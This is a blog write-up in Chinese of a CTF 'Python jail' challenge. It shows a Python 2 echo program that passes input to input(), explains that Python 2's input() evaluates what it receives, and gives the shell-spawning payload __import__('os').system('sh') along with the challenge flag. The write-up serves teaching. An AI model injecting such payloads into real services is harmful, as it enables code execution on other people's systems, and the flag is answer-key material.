---
title: "【NSSCTF每日一题】[HNCTF 2022 Week1]python2 input(JAIL)"
date: 2026-03-08T20:43:42+08:00
draft: false
summary: "摘要：分析一个Python2环境下的简单回显程序，其使用input()函数存在安全漏洞。由于Python2的input()会执行输入内容，可通过注入代码突破限制（如__import__('os').system('sh')获取shell）。该程序本质是\"Python监狱\"类题目，最终获取flag为NSSCTF{18d36691-3418-431c-bea7-f26915634f2f}。关键区别：Python2的input()会eval执行输入，而Python3的input()仅返回字符串"
slug: "nssctfmei-ri-yi-ti-hnctf-2022-week1-python2-input-jail"
originalId: 158811383
sourceUrl: "https://blog.csdn.net/BEICHENst/article/details/158811383"
categories:
  - "CTF"
tags:
  - "ctf"
  - "python"
  - "misc"
  - "nssctf"
  - "hnctf2022"
  - "CTF"
  - "网络安全"
featuredImage: "images/cover.png"
---

#### **查看附件，是python2的环境**

```python
# It's escape this repeat!

WELCOME = '''
              _   _      ___        ___    _____             _    _ _
             | | | |    / _ \      |__ \  |_   _|           | |  | | |
  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_
 | '_ \| | | | __| '_ \| | | | '_ \  / /    | | | '_ \| '_ \| |  | | __|
 | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_
 | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|
 | |     __/ |                                        | |
 |_|    |___/                                         |_|
'''

print WELCOME

print "Welcome to the python jail"
print "But this program will repeat your messages"
input_data = input("> ")
print input_data
```

#### 代码解析

1.  **语法特性**：代码使用 `print` 后直接跟内容（无括号）、`input()` 接收输入，是 **Python 2** 的语法，在 Python 3 中会报错（Python 3 中 `print` 是函数，需加括号，且 `input()` 行为也有差异）；
2.  **核心逻辑**：本质是 “输入 - 输出” 的简单回显，没有复杂逻辑，但注释 `It's escape this repeat!` 暗示这是一个 “Python 监狱” 类的题目，目标是突破 “仅重复输入” 的限制（比如通过输入 Python 代码执行命令）；
3.  **潜在漏洞**：Python 2 的 `input()` 会直接执行输入的字符串作为代码（比如输入 `__import__('os').system('ls')` 可执行系统命令），这是该 “监狱” 可被突破的关键。

**在python2中，`input`函数从标准输入接收输入，并且自动`eval`求值，返回求出来的值
在python2中，`raw_input`函数从标准输入接收输入，并返回输入字符串
在python3中，`input`函数从标准输入接收输入，并返回输入字符串**

#### **那么去getshell的payload:**

```sql
__import__('os').system('sh')
```

最后拿到题目的flag

![【NSSCTF每日一题】[HNCTF 2022 Week1]python2 input(JAIL) 配图 1](images/image-01.png)

#### Flag

```text
NSSCTF{18d36691-3418-431c-bea7-f26915634f2f}
```
